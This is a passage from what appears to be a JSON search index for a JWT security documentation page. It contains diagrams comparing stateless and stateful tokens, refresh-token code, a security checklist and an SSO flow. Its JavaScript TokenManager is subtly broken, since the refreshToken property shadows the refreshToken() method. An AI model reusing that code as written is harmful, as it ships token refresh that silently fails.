\u2502        \u2502\n\u2502       \u2502                 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502        \u2502\n\u2502       \u2502                        \u2502                 \u2502        \u2502\n\u2502       \u2502                 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502        \u2502\n\u2502       \u2502                 \u2502 Verify Sig   \u2502         \u2502        \u2502\n\u2502       \u2502                 \u2502 with Public  \u2502         \u2502        \u2502\n\u2502       \u2502                 \u2502 Key          \u2502         \u2502        \u2502\n\u2502       \u2502                 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502        \u2502\n\u2502       \u2502                        \u2502                 \u2502        \u2502\n\u2502       \u2502                 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502        \u2502\n\u2502       \u2502                 \u2502 Validate     \u2502         \u2502        \u2502\n\u2502       \u2502                 \u2502 Claims       \u2502         \u2502        \u2502\n\u2502       \u2502                 \u2502 (exp, aud)   \u2502         \u2502        \u2502\n\u2502       \u2502                 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502        \u2502\n\u2502       \u2502                        \u2502                 \u2502        \u2502\n\u2502       \u2502                    \u2705 Valid             \u2502        \u2502\n\u2502       \u2502                                           \u2502        \u2502\n\u2502       \u2502  3. Return Data                          \u2502        \u2502\n\u2502       \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524       \u2502\n\u2502       \u2502                                           \u2502        \u2502\n\u2502                                                             \u2502\n\u2502  \u2705 Advantages:                                            \u2502\n\u2502  \u2022 No database lookup                                      \u2502\n\u2502  \u2022 Fast verification                                       \u2502\n\u2502  \u2022 Scales horizontally                                     \u2502\n\u2502  \u2022 No server-side session storage                          \u2502\n\u2502                                                             \u2502\n\u2502  \u274c Disadvantages:                                         \u2502\n\u2502  \u2022 Cannot revoke token before expiry                       \u2502\n\u2502  \u2022 Must wait for token to expire                           \u2502\n\u2502  \u2022 If compromised, valid until expiry                      \u2502\n\u2502                                                             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#stateful-jwt-hybrid-approach","title":"Stateful JWT: Hybrid Approach","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              Stateful JWT Architecture                     \u2502\n\u2502          (JWT + Server-Side Validation)                    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                             \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\n\u2502  \u2502  Client  \u2502                              \u2502 API Server \u2502 \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                              \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n\u2502       \u2502                                           \u2502        \u2502\n\u2502       \u2502  1. Request with JWT                     \u2502        \u2502\n\u2502       \u2502  Authorization: Bearer eyJhbGci...       \u2502        \u2502\n\u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502       \u2502\n\u2502       \u2502                                           \u2502        \u2502\n\u2502       \u2502              2. Verify JWT Signature     \u2502        \u2502\n\u2502       \u2502                 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502        \u2502\n\u2502       \u2502                 \u2502 Verify Sig   \u2502         \u2502        \u2502\n\u2502       \u2502                 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502        \u2502\n\u2502       \u2502                        \u2502                 \u2502        \u2502\n\u2502       \u2502              3. Check Blacklist/DB       \u2502        \u2502\n\u2502       \u2502                 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502        \u2502\n\u2502       \u2502                 \u2502 Redis/DB     \u2502         \u2502        \u2502\n\u2502       \u2502                 \u2502 Lookup       \u2502         \u2502        \u2502\n\u2502       \u2502                 \u2502              \u2502         \u2502        \u2502\n\u2502       \u2502                 \u2502 SELECT *     \u2502         \u2502        \u2502\n\u2502       \u2502                 \u2502 FROM tokens  \u2502         \u2502        \u2502\n\u2502       \u2502                 \u2502 WHERE jti=?  \u2502         \u2502        \u2502\n\u2502       \u2502                 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502        \u2502\n\u2502       \u2502                        \u2502                 \u2502        \u2502\n\u2502       \u2502                 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502        \u2502\n\u2502       \u2502                 \u2502 Is Revoked?  \u2502         \u2502        \u2502\n\u2502       \u2502                 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502        \u2502\n\u2502       \u2502                        \u2502                 \u2502        \u2502\n\u2502       \u2502                    \u2705 Valid             \u2502        \u2502\n\u2502       \u2502                                           \u2502        \u2502\n\u2502       \u2502  4. Return Data                          \u2502        \u2502\n\u2502       \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524       \u2502\n\u2502       \u2502                                           \u2502        \u2502\n\u2502                                                             \u2502\n\u2502  \u2705 Advantages:                                            \u2502\n\u2502  \u2022 Can revoke tokens instantly                             \u2502\n\u2502  \u2022 Logout works immediately                                \u2502\n\u2502  \u2022 Better security control                                 \u2502\n\u2502                                                             \u2502\n\u2502  \u274c Disadvantages:                                         \u2502\n\u2502  \u2022 Database lookup required (slower)                       \u2502\n\u2502  \u2022 Not truly stateless                                     \u2502\n\u2502  \u2022 Loses some scalability benefits                         \u2502\n\u2502                                                             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#comparison-stateless-vs-stateful-jwt","title":"Comparison: Stateless vs Stateful JWT","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              Stateless vs Stateful JWT                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                  \u2502   STATELESS    \u2502      STATEFUL          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Server Storage   \u2502 \u274c None        \u2502 \u2705 Token blacklist     \u2502\n\u2502 Database Lookup  \u2502 \u274c No          \u2502 \u2705 Yes                 \u2502\n\u2502 Revocation       \u2502 \u274c Impossible  \u2502 \u2705 Instant             \u2502\n\u2502 Scalability      \u2502 \u2705 Excellent   \u2502 \u26a0\ufe0f Good                \u2502\n\u2502 Speed            \u2502 \u2705 Very Fast   \u2502 \u26a0\ufe0f Fast                \u2502\n\u2502 Logout           \u2502 \u274c Must wait   \u2502 \u2705 Immediate           \u2502\n\u2502 Complexity       \u2502 \u2705 Simple      \u2502 \u26a0\ufe0f More complex        \u2502\n\u2502 Security         \u2502 \u26a0\ufe0f Good        \u2502 \u2705 Better              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#best-practice-hybrid-stateless-approach","title":"Best Practice: Hybrid Stateless Approach","text":"<pre><code># \u2705 RECOMMENDED: Short-lived JWT + Refresh Token\nclass HybridJWTService:\n    def __init__(self):\n        self.access_token_ttl = 900       # 15 minutes (stateless)\n        self.refresh_token_ttl = 604800   # 7 days (stateful)\n        self.refresh_tokens = {}          # Store in Redis/DB\n\n    def login(self, user_id):\n        # Short-lived access token (stateless)\n        access_token = self.create_jwt(\n            user_id=user_id,\n            token_type=\"access\",\n            ttl=self.access_token_ttl\n        )\n\n        # Long-lived refresh token (stateful - stored server-side)\n        refresh_token = self.create_jwt(\n            user_id=user_id,\n            token_type=\"refresh\",\n            ttl=self.refresh_token_ttl\n        )\n\n        # Store refresh token in database/Redis\n        self.refresh_tokens[refresh_token] = {\n            'user_id': user_id,\n            'created_at': time.time(),\n            'last_used': time.time()\n        }\n\n        return {\n            'access_token': access_token,   # No DB lookup needed\n            'refresh_token': refresh_token,  # DB lookup required\n            'expires_in': self.access_token_ttl\n        }\n\n    def logout(self, refresh_token):\n        # Remove refresh token from storage\n        if refresh_token in self.refresh_tokens:\n            del self.refresh_tokens[refresh_token]\n\n        # Access token will expire naturally (15 min max)\n        return {'success': True}\n\n    def refresh_access_token(self, refresh_token):\n        # Check if refresh token exists (stateful check)\n        if refresh_token not in self.refresh_tokens:\n            raise ValueError(\"Invalid refresh token\")\n\n        # Generate new access token (stateless)\n        user_id = self.refresh_tokens[refresh_token]['user_id']\n        new_access_token = self.create_jwt(\n            user_id=user_id,\n            token_type=\"access\",\n            ttl=self.access_token_ttl\n        )\n\n        return {'access_token': new_access_token}\n\n# Benefits:\n# \u2705 Access token is stateless (99% of requests)\n# \u2705 Can revoke via refresh token invalidation\n# \u2705 Compromise window is only 15 minutes\n# \u2705 Scales well (most requests don't hit DB)\n</code></pre>"},{"location":"security/jwt/#best-practices-for-using-jwt","title":"Best Practices for Using JWT","text":""},{"location":"security/jwt/#1-token-lifetime-strategy","title":"1. Token Lifetime Strategy","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              Token Lifetime Recommendations                \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                             \u2502\n\u2502  Application Type       Access Token    Refresh Token      \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500       \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500    \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500     \u2502\n\u2502                                                             \u2502\n\u2502  Web App (SPA)          15 minutes      7 days             \u2502\n\u2502  Mobile App             30 minutes      30 days            \u2502\n\u2502  Desktop App            60 minutes      90 days            \u2502\n\u2502  API (M2M)              1 hour          No refresh         \u2502\n\u2502  Banking/Finance        5 minutes       1 day              \u2502\n\u2502  Internal Tools         1 hour          30 days            \u2502\n\u2502  IoT Devices            6 hours         1 year             \u2502\n\u2502                                                             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#2-token-rotation","title":"2. Token Rotation","text":"<pre><code>// \u2705 Automatic token refresh before expiry\nclass TokenManager {\n    constructor(accessToken, refreshToken, expiresIn) {\n        this.accessToken = accessToken;\n        this.refreshToken = refreshToken;\n        this.expiresAt = Date.now() + (expiresIn * 1000);\n\n        // Refresh 5 minutes before expiry\n        this.scheduleRefresh();\n    }\n\n    scheduleRefresh() {\n        const timeUntilExpiry = this.expiresAt - Date.now();\n        const refreshBuffer = 5 * 60 * 1000;  // 5 minutes\n        const refreshTime = timeUntilExpiry - refreshBuffer;\n\n        if (refreshTime &gt; 0) {\n            setTimeout(() =&gt; this.refreshToken(), refreshTime);\n        }\n    }\n\n    async refreshToken() {\n        try {\n            const response = await fetch('/api/refresh', {\n                method: 'POST',\n                headers: {\n                    'Content-Type': 'application/json'\n                },\n                body: JSON.stringify({\n                    refresh_token: this.refreshToken\n                })\n            });\n\n            const data = await response.json();\n\n            // Update tokens\n            this.accessToken = data.access_token;\n            this.expiresAt = Date.now() + (data.expires_in * 1000);\n\n            // Schedule next refresh\n            this.scheduleRefresh();\n\n        } catch (error) {\n            console.error('Token refresh failed:', error);\n            // Redirect to login\n            window.location.href = '/login';\n        }\n    }\n}\n</code></pre>"},{"location":"security/jwt/#3-security-checklist","title":"3. Security Checklist","text":"<pre><code>\u2705 JWT Security Best Practices Checklist:\n\nStorage:\n  \u2705 Use HttpOnly cookies (not localStorage)\n  \u2705 Set Secure flag (HTTPS only)\n  \u2705 Set SameSite=Strict (CSRF protection)\n  \u2705 Set appropriate Domain and Path\n\nToken Creation:\n  \u2705 Use strong signing algorithm (RS256 &gt; HS256)\n  \u2705 Include 'iss' (issuer) claim\n  \u2705 Include 'aud' (audience) claim\n  \u2705 Include 'exp' (expiration) claim\n  \u2705 Include 'jti' (unique ID) for revocation\n  \u2705 Use short expiration times (15 min)\n\nToken Validation:\n  \u2705 Verify signature\n  \u2705 Validate 'exp' (not expired)\n  \u2705 Validate 'nbf' (not before)\n  \u2705 Validate 'iss' (trusted issuer)\n  \u2705 Validate 'aud' (intended audience)\n  \u2705 Check token blacklist (if using)\n\nSecret Management:\n  \u2705 Use environment variables\n  \u2705 Rotate secrets regularly\n  \u2705 Use strong, random secrets (32+ bytes)\n  \u2705 Never commit secrets to version control\n  \u2705 Use different secrets for dev/staging/prod\n\nContent:\n  \u274c Never store passwords in JWT\n  \u274c Never store sensitive PII\n  \u274c Never store credit card data\n  \u2705 Only store minimal, non-sensitive data\n\nTransport:\n  \u2705 Always use HTTPS\n  \u2705 Use Authorization header (not URL)\n  \u2705 Implement rate limiting\n  \u2705 Log suspicious activity\n</code></pre>"},{"location":"security/jwt/#jwt-in-single-sign-on-sso","title":"JWT in Single Sign-On (SSO)","text":""},{"location":"security/jwt/#what-is-sso-with-jwt","title":"What is SSO with JWT?","text":"<p>Single Sign-On (SSO) allows users to authenticate once and access multiple applications without re-entering credentials. JWT is commonly used as the token format in SSO systems.</p>"},{"location":"security/jwt/#sso-architecture-with-jwt","title":"SSO Architecture with JWT","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    SSO Flow with JWT                            \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                                  \u2502\n\u2502                         Identity Provider (IdP)                  \u2502\n\u2502                      (Auth0, Okta, Keycloak)                    \u2502\n\u2502                      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                       \u2502\n\u2502                      \u2502  Authentication  \u2502                       \u2502\n\u2502                      \u2502     Server       \u2502                       \u2502\n\u2502                      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                       \u2502\n\u2502                               \u2502                                  \u2502\n\u2502                               \u2502 Issues JWT                       \u2502\n\u2502                               \u2502                                  \u2502\n\u2502         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502         \u2502                     \u2502                     \u2502           \u2502\n\u2502         \u25bc                     \u25bc                     \u25bc           \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u2502\n\u2502  \u2502   App 1    \u2502        \u2502   App 2    \u2502       \u2502   App 3    \u2502    \u2502\n\u2502  \u2502  (Gmail)   \u2502        \u2502  (Drive)   \u2502       \u2502 (Calendar) \u2502    \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2502\n\u2502                                                                  \u2502\n\u2502  User logs in ONCE \u2192 Gets JWT \u2192 Accesses ALL apps              \u2502\n\u2502                                                                  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#complete-sso-flow-step-by-step","title":"Complete SSO Flow (Step-by-Step)","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  User    \u2502         \u2502  App 1   \u2502         \u2502     IdP     \u2502         \u2502  App 2   \u2502\n\u2502 (Browser)\u2502         \u2502 (Gmail)  \u2502         \u2502 (Auth0)     \u2502         \u2502 (Drive)  \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518         \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502  1. Visit App 1    \u2502                       \u2502                     \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502                       \u2502                     \u2502\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502  2. Not authenticated, redirect to IdP     \u2502                     \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                       \u2502                     \u2502\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502  3. Redirected to IdP login page           \u2502                     \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502                     \u2502\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502  4. Enter credentials (username/password)  \u2502                     \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502                     \u2502\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502                    \u2502        5. Validate credentials             \u2502\n     \u2502                    \u2502           \u2705 User authenticated            \u2502\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502                    \u2502        6. Create JWT  \u2502                     \u2502\n     \u2502                    \u2502           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510             \u2502\n     \u2502                    \u2502           \u2502 Header:          \u2502             \u2502\n     \u2502                    \u2502           \u2502 {\"alg\":\"RS256\"}  \u2502             \u2502\n     \u2502                    \u2502           \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524             \u2502\n     \u2502                    \u2502           \u2502 Payload:         \u2502             \u2502\n     \u2502                    \u2502           \u2502 {sub: \"user123\"} \u2502             \u2502\n     \u2502                    \u2502           \u2502 {iss: \"auth0\"}   \u2502             \u2502\n     \u2502                    \u2502           \u2502 {aud: [\"app1\",   \u2502             \u2502\n     \u2502                    \u2502           \u2502       \"app2\",    \u2502             \u2502\n     \u2502                    \u2502           \u2502       \"app3\"]}   \u2502             \u2502\n     \u2502                    \u2502           \u2502 {exp: ...}       \u2502             \u2502\n     \u2502                    \u2502           \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518             \u2502\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502  7. Redirect back to App 1 with JWT       \u2502                     \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                     \u2502\n     \u2502  https://gmail.com/callback?token=eyJhbG...\u2502                     \u2502\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502  8. Extract JWT    \u2502                       \u2502                     \u2502\n     \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502                       \u2502                     \u2502\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502                    \u2502  9. Verify JWT with IdP's public key       \u2502\n     \u2502                    \u2502     (Fetch JWKS from IdP)                  \u2502\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502  10. Set session cookie, access granted    \u2502                     \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                       \u2502                     \u2502\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502  \u2705 Using App 1    \u2502                       \u2502                     \u2502\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502                                                                  \u2502\n     \u2502  11. Visit App 2 (same session, has JWT in cookie)              \u2502\n     